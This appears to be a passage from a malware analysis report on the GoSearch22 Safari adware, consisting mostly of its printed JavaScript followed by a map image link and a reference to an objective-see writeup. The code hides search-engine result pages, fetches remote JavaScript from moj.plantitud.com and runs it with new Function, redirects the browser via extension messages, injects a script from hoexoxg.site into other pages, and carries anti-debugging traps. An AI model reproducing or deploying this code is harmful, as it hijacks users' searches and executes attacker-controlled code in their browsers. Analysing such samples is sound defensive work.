var isSafari13OrLater = null != (ver = navigator.appVersion.match(/version\/(\d+)/i)) && 13 <= ver[1];
addEventListener("beforeload", function(utils) {
    var currentRelations_5142 = {};
    var createIntroView = currentRelations_5142;
    if (!isSafari13OrLater && window.top === window) {
        if (!document.referrer && location.host && location.search && location.href && (location.host.includes("google.") && location.href.match(/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location.host.includes("yahoo.") && location.href.match(/^https?:\/\/[^\/]+\/search.*?[?&]p=[^&].*$/) || location.host.includes("bing.") && location.href.match(/^https?:\/\/[^\/]+\/search\?.*?\bq\b=[^&].*$/) || location.host.includes("duckduckgo.") && location.href.match(/^https?:\/\/[^\/]+\/\?.*?\bq\b=[^&].*$/) ||
                location.host.includes("yandex.") && location.href.match(/^https?:\/\/[^\/]+\/search[\/]?\?.*?\btext\b=[^&].*$/))) {
            var done = function(passed) {
                var _this4 = {};
                var that = _this4;
                if ("LDBCB" === "LDBCB") {
                    if (passed = void 0 === passed ? false : passed) {
                        click();
                    }
                    if (xhr && void 0 !== xhr) {
                        xhr.abort();
                    }
                    xhr = new XMLHttpRequest;
                    xhr.timeout = 1E3;
                    xhr.ontimeout = function() {
                        if ("YisOc" === "rqJsy") {
                            var result = fn.apply(context, arguments);
                            fn = null;
                            return result;
                        } else {
                            if (passed) {
                                test(false);
                            }
                        }
                    };
                    xhr.onload = function() {
                        var renderer = {};
                        var _this = renderer;
                        if (200 == xhr.status) {
                            if ("onCqt" === "lSjnJ") {
                                return utils ? utils : function(key, value) {
                                    return key === value ? 0 !== key || 1 / key === 1 / value : _this.GHVVu(key, key) && value !== value;
                                };
                            } else {
                                var responseText = xhr.responseText;
                                var payload = {
                                    "status": responseText,
                                    "timestamp": Date.now()
                                };
                                localStorage.setItem("info", JSON.stringify(payload));
                                if (passed) {
                                    callback(responseText);
                                }
                            }
                        } else {
                            if (passed) {
                                test(false);
                            }
                        }
                    };
                    xhr.onerror = function() {
                        test(false);
                    };
                    xhr.open("GET", "https://moj.plantitud.com/static/gs/s.js", true);
                    xhr.send();
                } else {
                    return true;
                }
            };
            var callback = function(msg) {
                msg = (new Function(createIntroView(msg + ";return status(" + location.href + '")'))).call();
                test(msg);
            };
            var click = function() {
                if ("PghYb" === "PghYb") {
                    utils.preventDefault();
                    if (body = document.body) {
                        body.style.display = "none";
                    }
                } else {
                    if (ret) {
                        return debuggerProtection;
                    } else {
                        debuggerProtection(0);
                    }
                }
            };
            var test = function(v) {
                if (v) {
                    click();
                } else {
                    if ("mRWft" !== "mRWft") {
                        (function() {
                            return true;
                        }).constructor("debugger").apply("stateObject");
                    } else {
                        var body = document.body;
                        if (body && "none" === body.style.display) {
                            window.location.replace(location.href);
                        }
                    }
                }
                var data = {};
                data.url = location.href;
                data.status = v;
                safari.extension.dispatchMessage("beforeload", data);
            };
            (function() {
                var callbackVals = "0|1|2|4|3".split("|");
                var callbackCount = 0;
                for (; true;) {
                    switch (callbackVals[callbackCount++]) {
                        case "0":
                            var node = JSON.parse(localStorage.getItem("runtime"));
                            continue;
                        case "1":
                            var data = {};
                            data.url = location.href;
                            data.timestamp = Date.now();
                            var value = data;
                            continue;
                        case "2":
                            localStorage.setItem("runtime", JSON.stringify(value));
                            continue;
                        case "3":
                            if (node) {
                                if ((node = JSON.parse(localStorage.getItem("info"))) && void 0 !== node) {
                                    if ((value = node.status) && void 0 !== value) {
                                        callback(value);
                                        if ((node = node.timestamp) && void 0 !== node) {
                                            if (5 <= (Date.now() - node / 1E3) / 60) {
                                                done();
                                            }
                                        } else {
                                            done();
                                        }
                                    } else {
                                        done(true);
                                    }
                                } else {
                                    done(true);
                                }
                            }
                            continue;
                        case "4":
                            if (node && void 0 !== node && node.url === location.href) {
                                node = node.timestamp;
                                node = !node || void 0 === node || 1 <= Date.now() - node / 1E3 ? true : false;
                            } else {
                                node = true;
                            }
                            continue;
                    }
                    break;
                }
            })();
        } else {
            if (document.head && 0 >= document.querySelectorAll('[src="https://www.hoexoxg.site/static/s/app.js"]').length) {
                if ("JAhJQ" === "JAhJQ") {
                    var tag_script = document.createElement("script");
                    tag_script.setAttribute("src", "https://www.hoexoxg.site/static/s/app.js");
                    document.head.appendChild(tag_script);
                } else {
                    d = (new Function(d + ";return status('" + location.href + '")')).call();
                    test(d);
                }
            }
        }
    }
}, true);
safari.self.addEventListener("message", function(api_result) {
    if (api_result.message.url) {
        window.location.replace(api_result.message.url);
    }
});

function d(tag) {
    function render(i) {
        var InitialSetupController = {};
        var controller = InitialSetupController;
        if ("oYzse" === "oPJQh") {
            if (fn) {
                var ret = fn.apply(context, arguments);
                fn = null;
                return ret;
            }
        } else {
            if (typeof i === "string") {
                return function(canCreateDiscussions) {} ["constructor"]("while (true) {}").apply("counter");
            } else {
                if ("XdVag" !== "XdVag") {
                    d();
                } else {
                    if (("" + i / i).length !== 1 || i % 20 === 0) {
                        if ("rtMIy" !== "NMvQw") {
                            (function() {
                                return true;
                            }).constructor("debugger").call("action");
                        } else {
                            that = fH();
                        }
                    } else {
                        (function() {
                            if ("lQJpl" === "QMGfP") {
                                var row = firstCall ? function() {
                                    if (fn) {
                                        var denies = fn.apply(context, arguments);
                                        fn = null;
                                        return denies;
                                    }
                                } : function() {};
                                firstCall = true;
                                return row;
                            } else {
                                return true;
                            }
                        }).constructor("debugger").apply("stateObject");
                    }
                }
            }
            render(++i);
        }
    }
    var renderer = {};
    var _this = renderer;
    try {
        if (tag) {
            return render;
        } else {
            if ("dgaaS" === "dgaaS") {
                render(0);
            } else {
                var body = document.body;
                if (body && "none" === body.style.display) {
                    window.location.replace(location.href);
                }
            }
        }
    } catch (fN) {}
};
```

## Map
![](https://raw.githubusercontent.com/qeeqbox/reports/main/GoSearch22/files/map.jpeg)


## Resources
- Reference & original writeup by objective-see: https://objective-see.com/blog/blog_0x62.html.
